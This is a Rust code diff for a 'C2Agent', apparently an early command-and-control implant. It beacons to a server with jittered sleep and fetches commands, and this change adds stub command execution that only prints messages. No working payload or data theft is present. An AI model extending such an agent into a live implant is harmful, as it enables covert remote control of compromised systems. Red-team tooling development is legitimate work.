@@ -92,6 +92,8 @@ impl C2Agent {
             self.send_beacon().await?;
 
             // Actions
+            self.execute_commands();
+            self.clear_commands();
 
             // Calculate sleep duration with jitter
             let jitter: f64 = (base_duration as f64) * jitter_percent;
@@ -125,21 +127,34 @@ impl C2Agent {
             .json()
             .await?;
 
-        // Retrieve commands
+        // Add commands
         let commands = response.commands;
-        // Only add new commands to memory
-        if !commands.is_empty() {
-            for command in commands {
-                if !self.commands.contains(&command) {
-                    new_command_count += 1;
-                    self.commands.push(command);
+        self.commands.extend(commands);
+
+        info!("Added {} new command(s)", self.commands.len());
+
+        Ok(())
+    }
+
+    /// Execute commands
+    pub fn execute_commands(&self) -> Result<(), Box<dyn std::error::Error>> {
+        for command in self.commands.iter() {
+            match command.command_id {
+                0 => {
+                    println!("i'm pinging da server")
+                },
+                _ => {
+                    println!("don't understand command")
                 }
             }
         }
 
-        info!("Added {} new command(s)", new_command_count);
-
         Ok(())
+    }
+
+    /// Clear commands member after execution
+    pub fn clear_commands(&mut self) -> () {
+        self.commands = Vec::new();
     }
 }
 
